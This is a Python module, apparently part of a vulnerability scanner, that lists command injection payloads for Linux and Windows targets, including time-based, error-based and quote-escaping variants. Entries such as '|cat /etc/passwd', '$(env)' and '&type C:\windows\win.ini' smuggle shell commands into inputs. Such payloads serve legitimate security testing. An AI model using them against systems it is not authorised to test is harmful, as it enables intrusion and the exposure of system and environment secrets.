"""
Enhanced Command Injection payload collection with false positive filtering
"""

from typing import List
from utils.payload_loader import PayloadLoader

class CommandInjectionPayloads:
    """Enhanced Command Injection payload collection with context-aware payloads"""
    
    @staticmethod
    def get_all_payloads() -> List[str]:
        """Get all command injection payloads"""
        return (
            CommandInjectionPayloads.get_linux_payloads() +
            CommandInjectionPayloads.get_windows_payloads() +
            CommandInjectionPayloads.get_time_based_payloads() +
            CommandInjectionPayloads.get_error_based_payloads()
        )
    
    @staticmethod
    def get_linux_payloads() -> List[str]:
        """Get Linux/Unix command injection payloads"""
        return [
            # Basic command execution with high confidence indicators
            ';id',
            '|id', 
            '&&id',
            '||id',
            '`id`',
            '$(id)',
            
            # Whoami command (reliable user identification)
            ';whoami',
            '|whoami',
            '&&whoami', 
            '`whoami`',
            '$(whoami)',
            
            # System information commands
            ';uname -a',
            '|uname -a',
            '&&uname -a',
            '`uname -a`',
            '$(uname -a)',
            
            # File system commands with clear output
            ';ls -la',
            '|ls -la',
            '&&ls -la',
            '`ls -la`',
            '$(ls -la)',
            
            # Network interface information
            ';ifconfig',
            '|ifconfig',
            '&&ifconfig',
            '`ifconfig`',
            '$(ifconfig)',
            
            # Process information
            ';ps aux',
            '|ps aux', 
            '&&ps aux',
            '`ps aux`',
            '$(ps aux)',
            
            # Environment variables
            ';env',
            '|env',
            '&&env',
            '`env`',
            '$(env)',
            
            # File reading with distinctive content
            ';cat /etc/passwd',
            '|cat /etc/passwd',
            '&&cat /etc/passwd',
            '`cat /etc/passwd`',
            '$(cat /etc/passwd)',
            
            # Current directory
            ';pwd',
            '|pwd',
            '&&pwd',
            '`pwd`',
            '$(pwd)',
        ]
    
    @staticmethod
    def get_windows_payloads() -> List[str]:
        """Get Windows command injection payloads"""
        return [
            # Basic Windows commands
            '&whoami',
            '|whoami',
            '&&whoami',
            '||whoami',
            
            # System information with distinctive output
            '&systeminfo',
            '|systeminfo', 
            '&&systeminfo',
            '||systeminfo',
            
            # Directory listing
            '&dir',
            '|dir',
            '&&dir',
            '||dir',
            
            # Network configuration
            '&ipconfig',
            '|ipconfig',
            '&&ipconfig',
            '||ipconfig',
            
            # Process list
            '&tasklist',
            '|tasklist',
            '&&tasklist',
            '||tasklist',
            
            # Environment variables
            '&set',
            '|set',
            '&&set',
            '||set',
            
            # File reading
            '&type C:\\windows\\win.ini',
            '|type C:\\windows\\win.ini',
            '&&type C:\\windows\\win.ini',
            '||type C:\\windows\\win.ini',
            
            # Current directory
            '&cd',
            '|cd',
            '&&cd',
            '||cd',
            
            # PowerShell commands
            '&powershell Get-Process',
            '|powershell Get-Process',
            '&&powershell Get-Process',
            '||powershell Get-Process',
        ]
    
    @staticmethod
    def get_time_based_payloads() -> List[str]:
        """Get time-based command injection payloads for blind detection"""
        return [
            # Linux sleep commands
            ';sleep 5',
            '|sleep 5',
            '&&sleep 5',
            '`sleep 5`',
            '$(sleep 5)',
            
            # Windows timeout commands
            '&timeout 5',
            '|timeout 5', 
            '&&timeout 5',
            '||timeout 5',
            
            # Ping delays (cross-platform)
            ';ping -c 3 127.0.0.1',
            '|ping -c 3 127.0.0.1',
            '&&ping -c 3 127.0.0.1',
            '`ping -c 3 127.0.0.1`',
            '$(ping -c 3 127.0.0.1)',
            
            # Windows ping
            '&ping -n 3 127.0.0.1',
            '|ping -n 3 127.0.0.1',
            '&&ping -n 3 127.0.0.1',
            '||ping -n 3 127.0.0.1',
        ]
    
    @staticmethod
    def get_error_based_payloads() -> List[str]:
        """Get error-based command injection payloads"""
        return [
            # Invalid commands to trigger distinctive errors
            ';invalidcmd123',
            '|invalidcmd123',
            '&&invalidcmd123',
            '`invalidcmd123`',
            '$(invalidcmd123)',
            
            # File not found errors with distinctive messages
            ';cat /nonexistent/file123',
            '|cat /nonexistent/file123',
            '&&cat /nonexistent/file123',
            '`cat /nonexistent/file123`',
            '$(cat /nonexistent/file123)',
            
            # Windows file not found
            '&type C:\\nonexistent\\file123.txt',
            '|type C:\\nonexistent\\file123.txt',
            '&&type C:\\nonexistent\\file123.txt',
            '||type C:\\nonexistent\\file123.txt',
        ]
    
    @staticmethod
    def get_context_escape_payloads() -> List[str]:
        """Get payloads for escaping different contexts"""
        return [
            # Escaping quotes
            "';id;'",
            '";id;"',
            "';whoami;'",
            '";whoami;"',
            
            # Escaping parentheses
            ');id;(',
            ');whoami;(',
            
            # Escaping backticks
            '`;id;`',
            '`;whoami;`',
            
            # Multiple escape attempts
            "'\";id;\"'",
            "'\";whoami;\"'",
        ]
    
    @staticmethod
    def get_blind_payloads() -> List[str]:
        """Get blind command injection payloads"""
        all_payloads = PayloadLoader.load_payloads('command_injection')
        return [p for p in all_payloads if any(keyword in p.lower() for keyword in ['sleep', 'ping', 'timeout'])]
